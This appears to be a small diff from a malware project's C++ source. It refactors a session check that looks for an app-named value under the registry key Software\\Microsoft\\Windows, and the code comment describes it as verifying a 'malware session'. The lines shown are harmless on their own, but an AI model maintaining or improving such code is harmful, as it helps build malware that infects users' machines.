@@ -200,9 +200,7 @@ std::string SystemStorage::LoadValueReg(const char* path, const char* key) {
 
 // verify the existence of malware session.
 bool Session::CheckSession() {
-	if (!(systemStorage.LoadValueReg("Software\\Microsoft\\Windows", appName.c_str()).empty()))
-		return true;
-	return false;
+	return !(systemStorage.LoadValueReg("Software\\Microsoft\\Windows", appName.c_str()).empty());
 }
 
 SystemStorage::SystemStorage(std::string appNameArg) {
